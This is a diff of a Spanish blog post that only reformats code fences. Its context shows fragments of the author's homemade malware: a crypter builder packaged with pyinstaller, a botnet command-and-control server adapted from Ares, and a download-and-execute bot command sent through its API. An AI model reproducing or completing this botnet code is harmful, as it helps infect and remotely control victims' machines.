@@ -224,7 +224,7 @@ por
 
 Aunque me da un poco de vergüenza compartir código tan cutre (no soy programador y menos de python), pero aquí lo dejo:
 
-```python
+```
 
 import os, time, requests, sys, platform, locale, socket, configs, re
 os_encoding = locale.getpreferredencoding()
@@ -292,7 +292,7 @@ He cogido lo mejor de cada uno de los crypters mencionados y he envuelto la func
 
 Y aquí el código:
 
-```python
+```
 
 # pyinstaller --onefile --noconsole --clean --icon=drop.ico -n builder.exe --key=ZALFKD2VRTFSRHX9 builder.py
 
@@ -462,6 +462,7 @@ buildButton.configure(activebackground="#cc0000")
 buildButton.configure(activeforeground="#111111") 
 
 root.mainloop()
+
 ```
 
 #### El Servidor CnC
@@ -472,7 +473,7 @@ La parte del servidor no he cambiado mucho, ya que viene con todo que se necesit
 
 La parte importante de la de comunicación con los bots es la siguiente:
 
-```python
+```
 
 class CNC(object):
     @cherrypy.expose
@@ -542,6 +543,7 @@ class API(object):
         for entry in bot_queue:
             output += "> %s [...]\n\n" % entry[2]
         return output
+        
 ```
 
 En vez de tirar por el camino de Ares, que saca su funcionalidad de los módulos, uso únicamente el runcmd para ejecutar comandos de Powershell.
@@ -550,7 +552,7 @@ Por ejemplo para la función de descargar y ejecutar un fichero:
 
 HTML:
 
-```html
+```
 
 <div class="botcmd">
 <input type="text" name="downloadex" id="downloadex" onkeypress="keypressed(event)" />
@@ -560,7 +562,7 @@ HTML:
 
 JavaScript:
 
-```JavaScript
+```
 
 function download_execute(e) {
     $.post("../api/push", {
@@ -570,6 +572,7 @@ function download_execute(e) {
     $('#downloadex').val('');
     return false;
 }
+
 ```
 
 Estrenando crypter y server:
